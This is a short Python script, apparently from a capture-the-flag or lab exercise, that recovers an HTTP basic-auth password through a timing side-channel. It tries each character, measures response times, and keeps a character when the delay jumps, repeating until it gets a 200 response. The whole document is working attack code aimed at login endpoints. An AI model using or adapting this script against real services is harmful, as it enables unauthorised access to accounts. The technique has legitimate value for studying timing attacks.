import requests
import time
from time import sleep

lasttime=0
password=''
r = requests.get('', auth=('hacker', 'test'))

while r.status_code==401:
# for letter in range(ord('a'), ord('z')+1):
 for letter in range(127):
   start = time.time()
   r = requests.get('', auth=('hacker', str(password+chr(letter))))
   reqtime = time.time() - start
   print(password+chr(letter), "=", reqtime, r.status_code)
   diftime = reqtime - lasttime 
   print(diftime)
   lasttime=reqtime
   if 0.1 <= diftime <= 0.6:
       print("letter encoded")
       password+=chr(letter)
       letter='a'
       break
   if r.status_code == 200:
        print("got it")
        exit()
